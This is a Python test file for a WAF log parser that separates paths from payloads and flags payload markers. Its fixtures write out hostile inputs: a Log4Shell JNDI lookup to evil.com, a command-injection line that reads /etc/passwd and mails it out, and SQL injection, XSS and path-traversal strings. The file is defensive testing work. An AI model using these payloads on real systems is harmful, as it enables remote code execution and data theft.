"""Tests for core.waf_payload_parser — the split and the validation gate.

Per ``docs/waf_payload_analyzer.md`` D5, this layer decides *type*, not
threat. Two failure directions matter and they are not symmetric:

* claiming a line that is not a payload routes it away from provider enrichment,
  where it would otherwise have been looked up — a silent loss;
* refusing a line that is a payload means the analyst re-pastes it.

The gate is therefore tuned to reject unrelated lines carrying a stray pipe,
while the tests below pin the specific payload shapes that must never be
refused — starting with the one the briefing's own gate would have dropped.
"""
from __future__ import annotations

import unittest

from core import waf_payload_parser as wpp


class TestBriefingExamples(unittest.TestCase):
    """The three worked examples from the briefing, §2."""

    def test_sqli_with_path(self) -> None:
        result = wpp.parse_waf_line("/login?user= | ' OR '1'='1")
        self.assertIsNotNone(result)
        self.assertEqual(result.path, "/login?user=")
        self.assertEqual(result.payload, "' OR '1'='1")
        self.assertIn("sql-quote", result.markers)

    def test_log4shell_is_not_refused(self) -> None:
        # Regression for the briefing's own gate, which listed only
        # URL-encoding, HTML, SQL characters and traversal. The JNDI string has
        # none of those, so Log4Shell — the flagship case for the entire CVE
        # fingerprint layer — would have been dropped before analysis began.
        result = wpp.parse_waf_line("/api/data | ${jndi:ldap://evil.com/a}")
        self.assertIsNotNone(result)
        self.assertEqual(result.payload, "${jndi:ldap://evil.com/a}")
        self.assertIn("expression-injection", result.markers)

    def test_xss_without_delimiter_is_deferred_not_detected(self) -> None:
        # The briefing's second example carries no delimiter. D5 defers the
        # payload-only fallback, so this is a known and accepted miss rather
        # than a bug — pinned so the deferral stays a decision, not a surprise.
        self.assertIsNone(wpp.parse_waf_line("/search?q=<script>alert(1)</script>"))


class TestDelimiterSplitting(unittest.TestCase):
    def test_only_the_first_delimiter_splits(self) -> None:
        # A shell pipeline is one payload. Splitting on every pipe would mangle
        # exactly the payloads worth reading.
        result = wpp.parse_waf_line("/api | ; cat /etc/passwd | mail x@y.com")
        self.assertIsNotNone(result)
        self.assertEqual(result.path, "/api")
        self.assertEqual(result.payload, "; cat /etc/passwd | mail x@y.com")

    def test_bare_pipe_without_spaces_is_not_a_delimiter(self) -> None:
        self.assertIsNone(wpp.parse_waf_line("a|b"))
        self.assertIsNone(wpp.parse_waf_line("cmd|; whoami"))

    def test_no_delimiter_returns_none(self) -> None:
        self.assertIsNone(wpp.parse_waf_line("' OR '1'='1"))

    def test_empty_input_returns_none(self) -> None:
        for line in ("", "   "):
            with self.subTest(line=repr(line)):
                self.assertIsNone(wpp.parse_waf_line(line))

    def test_path_is_none_when_the_left_side_is_empty(self) -> None:
        result = wpp.parse_waf_line(" | ' OR 1=1")
        self.assertIsNotNone(result)
        self.assertIsNone(result.path)
        self.assertEqual(result.payload, "' OR 1=1")

    def test_raw_line_is_preserved_verbatim(self) -> None:
        line = "/login?user=   |   ' OR '1'='1"
        result = wpp.parse_waf_line(line)
        self.assertIsNotNone(result)
        self.assertEqual(result.raw_line, line)
        # The split trims, but the original survives for audit and display.
        self.assertEqual(result.path, "/login?user=")
        self.assertEqual(result.payload, "' OR '1'='1")


class TestEmptyPayload(unittest.TestCase):
    def test_empty_payload_is_kept_not_dropped(self) -> None:
        # The delimiter says the analyst meant a path/payload pair. Returning
        # None here would make parse_iocs discard the line silently; keeping it
        # lets the analyzer report "no payload supplied" instead.
        result = wpp.parse_waf_line("/login?user= | ")
        self.assertIsNotNone(result)
        self.assertEqual(result.payload, "")
        self.assertEqual(result.markers, [])
        self.assertEqual(result.path, "/login?user=")

    def test_stripped_trailing_delimiter_is_the_form_that_actually_arrives(self) -> None:
        # parse_iocs strips every line before typing it, so "/login?user= | "
        # reaches this module as "/login?user= |". Matching only the
        # space-pipe-space form made the empty-payload branch above unreachable
        # from the app — dead code guarded by a passing unit test, which is the
        # worst of both. Found by running a batch through parse_iocs end to end.
        result = wpp.parse_waf_line("/login?user= |")
        self.assertIsNotNone(result)
        self.assertEqual(result.path, "/login?user=")
        self.assertEqual(result.payload, "")

    def test_trailing_pipe_without_a_leading_space_is_not_a_delimiter(self) -> None:
        self.assertIsNone(wpp.parse_waf_line("value|"))


class TestValidationGate(unittest.TestCase):
    def test_innocuous_line_with_a_stray_pipe_is_refused(self) -> None:
        for line in (
            "server1 | server2",
            "Q3 report | draft version two",
            "CPU | 95% load average",
        ):
            with self.subTest(line=line):
                self.assertIsNone(wpp.parse_waf_line(line))

    def test_bare_percent_is_not_url_encoding(self) -> None:
        # The briefing's gate listed "%" as a marker. A percent sign followed by
        # anything other than two hex digits is not an encoding, and reading it
        # as one turns ordinary prose into a payload.
        self.assertEqual(wpp.payload_markers("95% load"), [])
        self.assertEqual(wpp.payload_markers("%2e%2e%2f"), ["url-encoding"])

    def test_encoded_traversal_is_admitted_by_its_encoding_not_its_shape(self) -> None:
        # %2e%2e%2f contains no literal "../" — that only appears after the
        # Layer 1 decode, which runs downstream of this gate. The encoding
        # marker is what admits the line, and it is sufficient. Pinned because
        # the obvious reading ("traversal payload, so path-traversal fires") is
        # wrong, and a future reader tightening the gate could break it.
        encoded = wpp.parse_waf_line("/download | %2e%2e%2fetc%2fpasswd")
        self.assertIsNotNone(encoded)
        self.assertEqual(encoded.markers, ["url-encoding"])

        plain = wpp.parse_waf_line("/download | ../../etc/passwd")
        self.assertIsNotNone(plain)
        self.assertEqual(plain.markers, ["path-traversal"])

    def test_sql_keywords_are_word_bounded(self) -> None:
        # "REUNION" and "SELECTION" contain UNION and SELECT as substrings.
        self.assertEqual(wpp.payload_markers("REUNION SELECTION"), [])
        self.assertIn("sql-keyword", wpp.payload_markers("1 UNION select 1"))

    def test_marker_coverage(self) -> None:
        cases = {
            "url-encoding": "%3Cscript%3E",
            "html-or-script": "<img src=x>",
            "sql-quote": "admin'--",
            "sql-comment": "1 /* c */ 2",
            "statement-separator": "1; DROP",
            "sql-keyword": "1 union all",
            "path-traversal": "../../etc/passwd",
            "expression-injection": "#{7*7}",
            "command-substitution": "$(id)",
            "null-byte": "file.php%00.jpg",
        }
        for marker, payload in cases.items():
            with self.subTest(marker=marker):
                self.assertIn(marker, wpp.payload_markers(payload))

    def test_markers_are_reported_in_declaration_order(self) -> None:
        # Order is stable so the UI can present "why this was treated as a
        # payload" the same way for every line.
        markers = wpp.payload_markers("<a>'; DROP TABLE x --")
        self.assertEqual(
            markers,
            ["html-or-script", "sql-quote", "sql-comment", "statement-separator",
             "sql-keyword"],
        )

    def test_empty_payload_has_no_markers(self) -> None:
        self.assertEqual(wpp.payload_markers(""), [])


class TestPredicate(unittest.TestCase):
    def test_predicate_agrees_with_the_parser(self) -> None:
        cases = (
            "/login?user= | ' OR '1'='1",
            "/api/data | ${jndi:ldap://evil.com/a}",
            "server1 | server2",
            "no delimiter here",
            "",
        )
        for line in cases:
            with self.subTest(line=line):
                self.assertEqual(
                    wpp.is_waf_payload_line(line),
                    wpp.parse_waf_line(line) is not None,
                )


if __name__ == "__main__":
    unittest.main()
